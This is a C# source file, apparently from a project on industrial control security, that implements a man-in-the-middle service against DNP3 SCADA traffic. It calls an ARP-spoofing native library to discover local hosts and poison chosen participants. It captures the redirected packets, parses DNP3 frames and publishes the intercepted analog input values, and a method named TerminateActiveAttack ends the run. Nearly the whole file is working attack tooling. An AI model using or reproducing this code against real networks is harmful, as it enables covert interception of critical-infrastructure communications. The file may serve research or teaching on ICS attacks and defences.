using DNP3DataPointsModel;
using DNP3TCPDriver.ApplicationLayer;
using DNP3TCPDriver.DataLinkLayer;
using DNP3TCPDriver.UserLevel;
using MITM_Common;
using MITM_Common.MITM_Service;
using PubSub;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MITM_Service
{
    public class MITM_Service : IMITM_Contract
    {
        [DllImport("ARPSpoof.dll", EntryPoint = "SniffForHosts", CallingConvention = CallingConvention.Cdecl)]
        public static extern void SniffForHosts(ref ConnectionInfoStruct connectionInfo);

        [DllImport("ARPSpoof.dll", EntryPoint = "ARPSpoof", CallingConvention = CallingConvention.Cdecl)]
        public static extern void ARPSpoof(ref ARPSpoofParticipantsInfo participants);

        [DllImport("ARPSpoof.dll", EntryPoint = "RetreivePackets", CallingConvention = CallingConvention.Cdecl)]
        public static extern void RetreivePackets(ref PacketStruct packetStructs);

        [DllImport("ARPSpoof.dll", EntryPoint = "Terminate", CallingConvention = CallingConvention.Cdecl)]
        public static extern void Terminate();

        private List<byte> hostsIPends;
        private int sniffForHostsInterval = 7;
        private bool terminate = false;

        private object packetLockObject;

        private Publisher publisher;

        private Queue<PacketStruct> packetStructs;
        private DataLinkHandler dNP3DataLinkHandler = new DataLinkHandler();

        public MITM_Service()
        {
            hostsIPends = new List<byte>();
            packetStructs = new Queue<PacketStruct>();
            packetLockObject = new object();
            publisher = new Publisher();
            dNP3DataLinkHandler = new DataLinkHandler();
        }

        public void ARPSpoof(ARPSpoofParticipantsInfo participants)
        {
            terminate = false;
            Task.Factory.StartNew(() => ARPSpoof(ref participants));
            Task.Factory.StartNew(() => PacketProducer());
            Task.Factory.StartNew(() => PacketConsumer());
        }

        public void PacketProducer()
        {
            int maxPacketNum = 20;
            PacketStruct packetStruct = new PacketStruct();

            while (!terminate)
            {
                RetreivePackets(ref packetStruct);

                if (packetStruct.source_addr[0] == 0)
                {
                    Thread.Sleep(100);
                    continue;
                }

                lock (packetLockObject)
                {
                    packetStructs.Enqueue(packetStruct);
                }

                Thread.Sleep(100);
            }
        }

        public void PacketConsumer()
        {
            PacketStruct packetStruct;

            while (!terminate)
            {
                if (packetStructs.Count() > 0)
                {
                    lock (packetLockObject)
                    {
                        packetStruct = packetStructs.Dequeue();
                    }

                    int offset = 54;

                    byte len = packetStruct.packet[offset + 2];

                    int actualLen = (byte)(2 + 1 + 5 + 2); // start + len + ctrl + dest + source + crc

                    len -= 5; // minus header

                    while (len > 0)
                    {
                        if (len < 16)
                        {
                            // last chunk
                            actualLen += (byte)(len + 2);
                            break;
                        }

                        actualLen += (byte)(16 + 2);
                        len -= 16;
                    }

                    byte[] message = new byte[actualLen];

                    for (int i = 0; i < actualLen; i++)
                    {
                        message[i] = packetStruct.packet[offset + i];
                    }
                    
                    List<UserLevelObject> userLevelObjects = dNP3DataLinkHandler.PackUp(message);

                    Task.Factory.StartNew(() => ProcessObjects(userLevelObjects));

                    Thread.Sleep(100);
                }
            }
        }

        void ProcessObjects(List<UserLevelObject> userLevelObjects)
        {
            foreach (UserLevelObject userObject in userLevelObjects)
            {
                if (userObject.FunctionCode == ApplicationFunctionCodes.RESPONSE)
                {
                    if (!userObject.IndicesPresent)
                    {
                        if (userObject.RangeFieldPresent)
                        {
                            if (userObject.RangePresent)
                            {
                                for (int i = userObject.StartIndex; i <=userObject.StopIndex; i++)
                                {
                                    AnalogInputPoint analogInputPoint;
                                    if (!Database.AnalogInputPoints.TryGetValue(i, out analogInputPoint))
                                    {
                                        analogInputPoint = new AnalogInputPoint();

                                        lock (Database.lockObject)
                                        {
                                            Database.AnalogInputPoints.Add(i, analogInputPoint);
                                        }
                                    }

                                    lock (Database.lockObject)
                                    {
                                        analogInputPoint.RawValue = BitConverter.ToInt32(userObject.Values[i], 0);
                                        analogInputPoint.Value = analogInputPoint.RawValue * analogInputPoint.ScaleFactor + analogInputPoint.ScaleOffset;
                                    }

                                    publisher.AnalogInputChange(analogInputPoint);
                                }
                            }
                        }
                    }
                }
            }
        }

        public void TerminateActiveAttack()
        {
            terminate = true;
            Terminate();
        }

        public List<Host> SniffForHosts()
        {
            ConnectionInfoStruct connectionInfoStruct = new ConnectionInfoStruct();
            connectionInfoStruct.SubnetMask = Database.GlobalConnectionInfo.SubnetMask;
            connectionInfoStruct.DefaultGateway = new byte[4] { 192, 168, 0, 1 };
            connectionInfoStruct.IPAddress = Database.GlobalConnectionInfo.IPAddress;
            connectionInfoStruct.MACAddress = Database.GlobalConnectionInfo.MACAddress;
            connectionInfoStruct.Name = Database.GlobalConnectionInfo.Name;
            connectionInfoStruct.Hosts = new byte[200];
            connectionInfoStruct.Sleep = (this.sniffForHostsInterval) * 1000;

            SniffForHosts(ref connectionInfoStruct);

            List<Host> hosts = new List<Host>();

            int j = 0;
            while (connectionInfoStruct.HostCount > 0)
            {
                if (hostsIPends.Contains(connectionInfoStruct.Hosts[j]) || connectionInfoStruct.Hosts[j] == Database.GlobalConnectionInfo.IPAddress[3])
                {
                    j += 7;
                    connectionInfoStruct.HostCount--;
                    continue;
                }

                hostsIPends.Add(connectionInfoStruct.Hosts[j]);

                Host host = new Host();

                // bug ako subnet mask nije odgovarajuc!!!!!
                host.IPAddressArray
                    = new byte[4] {
                        Database.GlobalConnectionInfo.IPAddress[0],
                        Database.GlobalConnectionInfo.IPAddress[1],
                        Database.GlobalConnectionInfo.IPAddress[2],
                        connectionInfoStruct.Hosts[j]
                    };

                for (int k = 0; k < 4; k++)
                {
                    host.IPAddressString += host.IPAddressArray[k];

                    if (k != 3)
                    {
                        host.IPAddressString += ".";
                    }
                }

                host.MACAddressArray = new byte[6];
                for (int k = 0; k < 6; k++)
                {
                    host.MACAddressArray[k] = connectionInfoStruct.Hosts[++j];

                    host.MACAddressString += host.MACAddressArray[k].ToString("X");

                    if (k != 5)
                    {
                        host.MACAddressString += ":";
                    }
                }

                hosts.Add(host);

                j++;
                connectionInfoStruct.HostCount--;
            }

            return hosts;
        }
    }
}
